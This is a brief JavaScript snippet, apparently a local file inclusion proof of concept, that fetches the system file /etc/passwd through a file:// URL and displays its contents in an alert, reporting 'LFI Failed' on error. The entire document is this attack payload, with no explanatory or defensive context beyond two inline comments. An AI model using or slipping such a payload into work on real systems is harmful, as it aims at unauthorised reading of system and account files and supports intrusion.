fetch('file:///etc/passwd')
  .then(response => response.text())
  .then(text => alert(text))  // This will display the file content in an alert
  .catch(e => alert('LFI Failed: ' + e));  // In case of failure, show error
